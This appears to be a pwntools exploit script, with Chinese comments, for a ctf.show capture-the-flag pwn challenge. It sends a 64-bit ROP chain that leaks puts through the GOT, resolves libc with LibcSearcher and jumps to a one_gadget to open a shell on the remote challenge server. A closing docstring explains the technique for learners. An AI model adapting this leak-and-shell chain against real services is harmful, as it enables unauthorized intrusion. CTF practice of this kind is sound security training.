from pwn import *
from LibcSearcher import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28285)

# message_pattern = 0x6061C0：存储消息的地址
message_pattern = 0x6061C0

# puts_plt = 0x400BD0：puts函数的PLT表地址
puts_plt = 0x400BD0

# puts_got = 0x606020：puts函数的GOT表地址
puts_got = 0x606020

# readn = 0x400F1E：readn函数的地址
readn = 0x400F1E

# pop_rdi = 0x4044d3：pop rdi; ret gadget的地址
pop_rdi = 0x4044d3

# pop_rsi_r15 = 0x4044d1：pop rsi; pop r15; ret gadget的地址
pop_rsi_r15 = 0x4044d1

# ret = 0x40150c：ret指令的地址，用于栈对齐
ret = 0x40150c

# 交互流程
io.recvuntil("option:\n")
io.sendline("1")
io.sendline("No")
io.sendline("yes")
io.sendline('-2')

# 构造payload，填充message_pattern地址
payload = p64(message_pattern) * 37 + p64(ret)
io.sendline(payload)

# 构造ROP链，用于泄露puts地址并读取shellcode
# p64(0)：padding
# p64(pop_rdi) + p64(puts_got) + p64(puts_plt)：调用puts函数泄露puts的GOT表地址
# p64(pop_rdi) + p64(message_pattern + 0x50)：设置第一个参数为message_pattern + 0x50
# p64(pop_rsi_r15) + p64(1024) + p64(message_pattern + 0x50) + p64(readn)：调用readn函数读取1024字节到message_pattern + 0x50
payload = p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(message_pattern + 0x50) + p64(pop_rsi_r15) + p64(1024) + p64(message_pattern + 0x50) + p64(readn)

io.send(payload)

# 接收并解析puts的地址
io.recvuntil("pattern:\n")
puts = u64(io.recvuntil("\n")[:-1].ljust(8, b"\x00"))

# 使用LibcSearcher查找libc版本
libc = LibcSearcher("puts", puts)

# 计算libc基址和one_gadget地址
libc_base = puts - libc.dump("puts")
one_gadget = libc_base + 0x4f302

# 发送one_gadget地址
payload = p64(one_gadget)
io.send(payload)

io.interactive()

"""
【知识点讲解】
1. 题目类型：ROP + one_gadget - 64位ROP链 + one_gadget利用
2. 核心原理：
   - 利用ROP链泄露puts函数的地址
   - 根据泄露的地址计算libc基址
   - 使用one_gadget获取shell
3. 关键步骤：
   - 构造初始payload，填充message_pattern地址
   - 构造ROP链，泄露puts地址并准备读取shellcode
   - 计算libc基址和one_gadget地址
   - 发送one_gadget地址获取shell
4. 执行流程：
   - 交互流程 -> 构造ROP链 -> 泄露puts地址 -> 计算libc基址 -> 执行one_gadget获取shell
5. 技术要点：
   - 64位ROP链构造
   - libc地址泄露
   - one_gadget的使用
   - LibcSearcher的使用
"""
